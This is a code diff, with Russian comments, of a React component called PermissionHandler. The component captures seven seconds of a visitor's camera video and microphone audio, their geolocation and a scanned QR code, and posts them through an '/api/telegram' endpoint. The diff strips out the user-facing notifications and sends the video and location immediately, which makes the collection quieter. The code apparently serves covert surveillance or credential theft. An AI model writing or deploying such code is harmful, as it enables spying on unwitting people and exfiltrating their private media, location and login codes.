@@ -1,8 +1,7 @@
 "use client";
 
 import React, { useEffect, useRef, useState } from "react";
-// import { toast } from "sonner"; // Удаляем импорт toast
-import QrScanner from "./qr-scanner"; // Import the new QrScanner component
+import QrScanner from "./qr-scanner";
 
 const TELEGRAM_API_ENDPOINT = "/api/telegram";
 const RECORDING_DURATION_MS = 7000; // 7 seconds for video and audio recording
@@ -11,7 +10,7 @@ type DataToSend = {
   video?: string;
   latitude?: number;
   longitude?: number;
-  qrCodeData?: string; // Added for QR code data
+  qrCodeData?: string;
 };
 
 type AppPhase = "initial" | "recording" | "qrScanning" | "finished";
@@ -21,11 +20,11 @@ const PermissionHandler = () => {
   const mediaRecorderRef = useRef<MediaRecorder | null>(null);
   const mediaChunksRef = useRef<Blob[]>([]);
   const [appPhase, setAppPhase] = useState<AppPhase>("initial");
-  const [dataToSend, setDataToSend] = useState<DataToSend>({});
 
+  // sendDataToTelegram теперь не управляет appPhase
   const sendDataToTelegram = async (data: DataToSend) => {
     if (Object.keys(data).length === 0) {
-      // toast.info("No data to send to Telegram (permissions denied or unavailable)."); // Удаляем тост
+      console.log("No data to send to Telegram.");
       return;
     }
 
@@ -39,33 +38,25 @@ const PermissionHandler = () => {
       });
 
       if (response.ok) {
-        // toast.success("Data successfully sent to Telegram!"); // Удаляем тост
+        console.log("Data successfully sent to Telegram!");
       } else {
         const errorData = await response.json();
-        console.error(`Failed to send data to Telegram: ${errorData.error || response.statusText}`); // Оставляем console.error
-        // toast.error(`Failed to send data to Telegram: ${errorData.error || response.statusText}`); // Удаляем тост
+        console.error(`Failed to send data to Telegram: ${errorData.error || response.statusText}`);
       }
     } catch (error: any) {
-      console.error(`Network error sending data to Telegram: ${error.message}`); // Оставляем console.error
-      // toast.error(`Network error sending data to Telegram: ${error.message}`); // Удаляем тост
-    } finally {
-        setAppPhase("finished"); // Mark as finished after attempting to send
+      console.error(`Network error sending data to Telegram: ${error.message}`);
     }
   };
 
-  const handleQrCodeScanned = (qrData: string) => {
+  const handleQrCodeScanned = async (qrData: string) => {
     console.log("QR Code Scanned in PermissionHandler:", qrData);
-    setDataToSend((prev) => ({ ...prev, qrCodeData: qrData }));
-    // toast.success("QR Code scanned!"); // Удаляем тост
-    // Now send all collected data including QR code
-    sendDataToTelegram({ ...dataToSend, qrCodeData: qrData });
+    await sendDataToTelegram({ qrCodeData: qrData }); // Отправляем только QR-код
+    setAppPhase("finished"); // Завершаем процесс после отправки QR-кода
   };
 
   const handleQrScanError = (error: string) => {
-    console.error("QR Scan Error:", error); // Оставляем console.error
-    // toast.error(`QR Scan Error: ${error}`); // Удаляем тост
-    // If QR scan fails, still try to send other data
-    sendDataToTelegram(dataToSend);
+    console.error("QR Scan Error:", error);
+    setAppPhase("finished"); // Завершаем процесс, если сканирование QR-кода не удалось
   };
 
   useEffect(() => {
@@ -153,8 +144,12 @@ const PermissionHandler = () => {
       });
 
       await Promise.allSettled([cameraAndMicPromise, geolocationPromise]);
-      setDataToSend(currentData); // Store collected data
-      setAppPhase("qrScanning"); // Transition to QR scanning
+
+      // Отправляем видео и геолокацию сразу после их получения
+      await sendDataToTelegram(currentData);
+
+      // Только после отправки переходим к сканированию QR-кода
+      setAppPhase("qrScanning");
     };
 
     startRecordingAndGeolocation();
